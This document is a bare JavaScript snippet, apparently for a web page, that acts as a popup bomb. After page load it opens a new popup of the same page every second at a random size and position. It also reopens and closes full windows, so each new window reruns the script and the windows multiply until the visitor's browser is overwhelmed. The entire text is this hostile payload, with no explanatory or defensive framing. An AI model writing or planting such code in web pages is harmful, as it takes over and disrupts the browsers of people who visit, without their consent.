try{
document.body.style.backgroundImage = "url('bg.gif')";
window.addEventListener("load", function(){
try{
var win;
var win2;
setTimeout(function(){
setInterval(function(){
win = window.open(location.href, "", 'width=400, height=200');
win.resizeTo(Math.random() * screen.width, Math.random() * screen.height);
win.moveTo(Math.random() * screen.width, Math.random() * screen.height);
if(win2){
win2.close();
}
win2 = window.open(location.href);
}, 1000);
}, 1000);
} catch(e){
  alert(e.message);
}
});
} catch(e){
  alert(e.message);
}
